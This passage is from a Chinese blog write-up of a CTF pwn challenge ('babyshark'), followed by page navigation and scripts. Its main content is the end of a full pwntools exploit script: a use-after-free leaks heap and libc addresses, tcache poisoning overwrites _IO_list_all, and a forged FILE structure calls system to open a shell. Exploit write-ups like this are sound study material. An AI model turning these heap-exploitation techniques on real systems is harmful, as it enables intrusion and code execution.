class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">2</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    payload+=m(<span class="number">3</span>&lt;&lt;<span class="number">3</span>)+m(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=m(<span class="number">2</span>+(<span class="number">4</span>&lt;&lt;<span class="number">3</span>))+m(<span class="built_in">len</span>(content))+content</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Id</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">3</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Id</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">4</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">Id</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">9</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>():</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">5</span>)</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;heap service ready\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf00</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">uaf(<span class="number">1</span>)</span><br><span class="line">io.sendline()</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;freed\n&quot;</span>)</span><br><span class="line">heap=u64(io.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0xb90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;freed\n&quot;</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x21ace0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#=======================================3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">key=heap&gt;&gt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">_IO_list_all=libc.sym._IO_list_all+base</span><br><span class="line">system=libc.sym.system+base</span><br><span class="line">edit(<span class="number">3</span>,p64(key^_IO_list_all))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(heap+<span class="number">0x340</span>))</span><br><span class="line">data=heap+<span class="number">0x340</span></span><br><span class="line">_IO_wfile_jumps=base+libc.sym._IO_wfile_jumps</span><br><span class="line">fake=flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>:<span class="string">&quot;  sh&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>:p64(<span class="number">1</span>),</span><br><span class="line">    <span class="number">0x68</span>:p64(system),</span><br><span class="line">    <span class="number">0x88</span>:p64(heap+<span class="number">0x900</span>),</span><br><span class="line">    <span class="number">0xa0</span>:p64(data),</span><br><span class="line">    <span class="number">0xd8</span>:p64(_IO_wfile_jumps),</span><br><span class="line">    <span class="number">0xe0</span>:p64(data)</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">5</span>,fake)</span><br><span class="line">ex()</span><br><span class="line">io.sendline(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本道题解数少,最重要的原因是<code>结构体</code>与<code>算法</code>的逆向复杂+耗费时间,且由于ctf+awdp并发进行,pwn手只能专注于一方面的攻击<br>无论是在ctf还是iot的学习中,我总感觉自己的逆向能力在AI的帮助下不断退化,可能这也是不少pwn手目前的真实写照<br>在去<code>AI</code>的情况下打出这道题,真的让我很开心  <em>: )</em></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/as.jpg" data-sizes="auto" alt="" class="lazyload">
+        
+      
+      <a href="/2025/09/11/offbuynull/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          (no title)
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        56.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        04:20
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">附件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E9%80%86%E5%90%91"><span class="toc-number">2.1.</span> <span class="toc-text">数据包逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E7%9A%84%E8%BD%AC%E5%8C%96"><span class="toc-number">2.1.1.</span> <span class="toc-text">字符串与数字的转化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%88%90opcode%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">组成opcode的结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Idx%E7%9A%84%E8%8E%B7%E5%8F%96%E7%AE%97%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text">Idx的获取算法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%9D%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">堆块管理系统分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#create"><span class="toc-number">2.2.1.</span> <span class="toc-text">create</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">2.2.2.</span> <span class="toc-text">edit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delet-show"><span class="toc-number">2.2.3.</span> <span class="toc-text">delet&#x2F;show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uaf"><span class="toc-number">2.2.4.</span> <span class="toc-text">uaf</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcachebins-poison%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">tcachebins_poison攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0IO%E7%BB%93%E6%9E%84%E4%BD%93-%E5%B9%B6%E8%A7%A6%E5%8F%91%E5%85%B6%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E8%A1%A8"><span class="toc-number">3.3.</span> <span class="toc-text">伪造IO结构体,并触发其中的函数表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toc-number">4.</span> <span class="toc-text">完整EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">5.</span> <span class="toc-text">后记</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "babyshark",
+          url: "https://khighl.github.io.git/2025/09/16/%E6%B8%AF%E6%B9%BE%E6%9D%AF/",
+          excerpt: "",
+          description: "",
+          stripContent: "前言昨天刚刚结束的湾区杯全场只有5解的pwn题,差点拿到3血(其实差了不少: &amp;#x2F;  )失去了AI的辅助,全身心投入逆向分析,看起来也不是件坏事 附件分析附件可以到看雪上下载: 下载链接本题的数据传输采取了类似protobuf的序列化&amp;#x2F;反序列化数据包传输指令所以我们在进行堆利用前要将自定义的vm操作梳理清楚 数据包逆向在主逻辑前,先是进行了对时间种子的设置经典的伪随机数 随后是个循环读入注意看这里读入的循环判断,是当前读入的字节(char)为负数 字符串与数字的转化读入后进行了",
+          date: "Tue Sep 16 2025 00:00:00 GMT+0800",
+          updated: "Tue Sep 16 2025 21:26:15 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
